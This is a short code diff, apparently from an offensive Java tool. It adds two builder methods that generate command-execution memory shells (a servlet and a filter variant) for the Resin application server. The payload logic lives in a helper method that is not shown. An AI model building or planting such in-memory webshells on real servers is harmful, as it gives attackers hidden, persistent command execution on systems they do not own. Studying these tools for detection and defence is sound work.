@@ -203,6 +203,20 @@ public class MSJavaClassBuilder {
         return JavaClassModifier.toBytes(ctClass);
     }
 
+    @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Servlet)
+    @MemShellFunction(MemShellFunction.Exec)
+    public byte[] resinServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Filter)
+    @MemShellFunction(MemShellFunction.Exec)
+    public byte[] resinFilterExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
     public void resinListenerResponseMaker(CtClass ctClass) throws Exception{
         // response
         CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
